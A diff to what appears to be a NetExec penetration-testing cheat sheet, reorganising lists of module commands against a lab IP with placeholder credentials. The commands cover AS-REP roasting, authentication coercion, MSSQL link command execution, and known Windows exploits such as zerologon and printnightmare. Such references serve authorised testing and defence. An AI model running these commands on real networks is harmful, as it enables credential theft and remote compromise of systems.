@@ -28,7 +28,7 @@ nxc ldap 192.168.0.10 -u 'user' -p 'password' --asreproast asrep_hashes
 ## Enumeration Modules
 
 ```powershell
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M whoami
+nxc ldap 192.168.0.10 -u 'user' -p 'password' -M whoami
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_av
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_ca
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_dns
@@ -113,21 +113,16 @@ nxc smb 192.168.0.10 -u 'user' -p 'password' -M drop-sc
 ## Active Directory Modules
 
 ```powershell
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M adcs
+nxc smb 192.168.0.10 -u 'user' -p 'password' -M coerce_plus
+
+nxc ldap 192.168.0.10 -u 'user' -p 'password' -M adcs
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_ca
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M daclread
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M petitpotam
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M printerbug
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M shadowcoerce
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M dfscoerce
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M coerce_plus
+
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M mssql_coerce
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M mssql_priv
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M scuffy
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M slinky
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M pre2k
+
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M timeroast
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M sccm
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M link_enable_xp
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M link_xpcmd
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M exec_on_link
@@ -142,7 +137,6 @@ nxc smb 192.168.0.10 -u 'user' -p 'password' -M ms17-010
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M zerologon
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M printnightmare
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M nopac
-nxc smb 192.168.0.10 -u 'user' -p 'password' -M smbghost
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M shadowrdp
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M install_elevated
 nxc smb 192.168.0.10 -u 'user' -p 'password' -M remove-mic
